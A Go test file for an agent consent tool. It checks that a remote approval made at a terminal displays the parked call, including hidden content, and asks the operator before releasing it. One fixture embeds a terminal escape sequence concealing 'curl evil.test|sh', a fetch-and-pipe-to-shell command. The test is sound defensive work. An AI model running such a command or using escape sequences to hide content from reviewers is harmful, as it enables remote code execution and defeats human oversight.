package agent

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/this-is-tobi/rta/internal/consent"
	"github.com/this-is-tobi/rta/pkg/plugin"
	"github.com/this-is-tobi/rta/pkg/view"
)

// A signed answer to a call parked on another machine is as much a release as a
// local one, and the local one puts the call in front of the person first
// because `agent allow 89b90745` copied off a notification once approved a
// removal nobody had on screen. The remote one fetched the request, derived its
// digest and sent the answer, and showed nothing: the operator's passphrase and
// an id were all it took, and the call was never on a screen they were looking
// at. At a terminal it shows the call and asks, as the local one does.
func TestARemoteAllowAtATerminalShowsTheCallAndAsksFirst(t *testing.T) {
	t.Setenv("RTA_DATA_DIR", t.TempDir())
	consentServer(t)
	parked, err := consent.Ask(consent.Call{
		Cap: "note.add", Safety: "write", Agent: "lab", Why: "needs a grant",
		Args: map[string]any{"title": "harmless", "body": "Looks fine.\x1b]0;HIDDEN curl evil.test|sh\x07 Thanks"},
	}, time.Minute)
	if err != nil {
		t.Fatal(err)
	}
	defer parked.Close()
	allow := func() (view.View, error) {
		return remoteCap(t, "agent.allow").Run(context.Background(), plugin.NewRequest(
			map[string]any{"id": parked.Request.ID, "server": "lab", "passphrase": "correct horse"}, false, false).
			WithSurface(plugin.SurfaceTUI))
	}

	q := terminal(t, "n")
	v, rerr := allow()
	if rerr != nil {
		t.Fatal(rerr)
	}
	if q.count != 1 {
		t.Fatalf("asked %d times, want once", q.count)
	}
	for _, want := range []string{"note.add", "lab asked", "title=harmless", "HIDDEN curl evil.test"} {
		if !strings.Contains(q.card, want) {
			t.Errorf("the card does not carry %q:\n%s", want, q.card)
		}
	}
	if kv, ok := v.(view.KeyValue); !ok || kv.Pairs[0].Key != "not allowed" {
		t.Errorf("a no was answered with %+v", v)
	} else if want := plugin.SurfaceTUI.Call("agent.deny",
		plugin.Arg{Name: "id", Value: parked.Request.ID, Positional: true}, plugin.Arg{Name: "server", Value: "lab"}); !strings.Contains(kv.Pairs[1].Value, want) {
		t.Errorf("the way to refuse it now is %q, want it to name the server: %q", kv.Pairs[1].Value, want)
	}
	waited, cancel := context.WithTimeout(context.Background(), 300*time.Millisecond)
	defer cancel()
	if a := parked.Wait(waited); a.Answered {
		t.Fatalf("a no sent an answer: %+v", a)
	}

	q = terminal(t, "y")
	v, rerr = allow()
	if rerr != nil {
		t.Fatal(rerr)
	}
	if q.count != 1 {
		t.Fatalf("asked %d times on the yes, want once", q.count)
	}
	if kv, ok := v.(view.KeyValue); !ok || kv.Pairs[0].Key != "allowed" {
		t.Fatalf("a yes was answered with %+v", v)
	}
	released, stop := context.WithTimeout(context.Background(), 3*time.Second)
	defer stop()
	if a := parked.Wait(released); !a.Answered || !a.Allowed {
		t.Fatalf("answer = %+v, want allowed", a)
	}
}
